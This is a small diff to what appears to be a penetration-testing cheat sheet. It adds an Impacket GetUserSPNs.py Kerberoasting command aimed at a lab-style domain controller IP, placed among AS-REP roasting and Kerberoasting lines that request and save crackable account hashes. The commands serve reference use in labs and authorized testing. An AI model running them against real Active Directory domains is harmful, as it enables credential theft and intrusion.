@@ -45,6 +45,7 @@ GetNPUsers.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
 GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
 
 # GetUserSPNs.py (Kerberoasting)
+GetUserSPNs.py DOMAIN/username -dc-ip 10.129.41.38 -request
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request-user svc-account
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -outputfile hashes.txt
